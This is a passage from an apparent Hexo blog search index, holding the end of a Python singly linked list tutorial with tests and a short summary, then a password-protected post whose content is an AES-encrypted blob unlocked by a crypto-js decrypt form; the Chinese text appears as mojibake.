class="comment">#åˆ¤æ–­æ˜¯å¦ä¸ºå¤´ç»“ç‚¹</span></span><br><span class="line">                  <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                      self.__head = cur.next</span><br><span class="line">                  <span class="keyword">else</span>:</span><br><span class="line">                      pre.next = cur.next</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pre = cur</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span> <span class="comment"># æŸ¥æ‰¾å…ƒç´ </span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = SingleLinklist()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3 </span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»ä½“æ„Ÿè§‰åœ¨å†™å•é“¾è¡¨çš„æ—¶å€™è¦æ³¨æ„å‡ ä¸ªé—®é¢˜ï¼Œæ³¨æ„è¦å¤šè€ƒè™‘ä¸€ä¸‹å‡ ç§å…¸å‹çš„æƒ…å†µï¼Œæ¯”å¦‚ç©ºé“¾è¡¨ï¼Œåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„æ—¶å€™ï¼Œæˆ–è€…æ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹çš„æƒ…å†µç­‰ç­‰ã€‚ã€‚ã€‚ç¬¬äºŒçš„è¯è¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹å˜é‡çš„èµ‹å€¼ï¼Œè¿™ä¸œè¥¿å¾ˆå®¹æ˜“å†™ç€å†™ç€è„‘å­å°±æŠ½äº†ï¼Œç„¶åå°±ä¼šå‡ºç°æº¢å‡ºçš„æƒ…å†µé¢ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ç¼–ç¨‹è¯­è¨€ </tag>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä¸¤å¹´</title>
      <link href="/writing-1.html"/>
      <url>/writing-1.html</url>
      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">è¯·è¾“å…¥å¯†ç </h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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